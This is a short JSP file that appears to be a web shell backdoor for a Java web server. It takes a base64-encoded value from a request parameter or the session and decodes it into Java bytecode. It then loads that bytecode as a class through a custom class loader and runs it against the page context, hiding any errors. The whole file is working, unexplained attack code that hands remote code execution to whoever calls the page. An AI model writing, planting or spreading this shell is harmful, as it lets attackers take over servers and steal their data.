<%@page import="javax.xml.bind.*,java.lang.*"%><%!class U extends ClassLoader {
		U(ClassLoader c) {
			super(c);
		}

		public Class g(byte[] b) {
			return super.defineClass(b, 0, b.length);
		}
	}%>
<%String c = request.getParameter("c");
if(null == c && null != session && null != (c = (String)session.getAttribute("c")));
if(null != c)
	try {
		new U(this.getClass().getClassLoader()).g(DatatypeConverter.parseBase64Binary(c)).newInstance().equals(this);
		}catch(Exception e) {}%>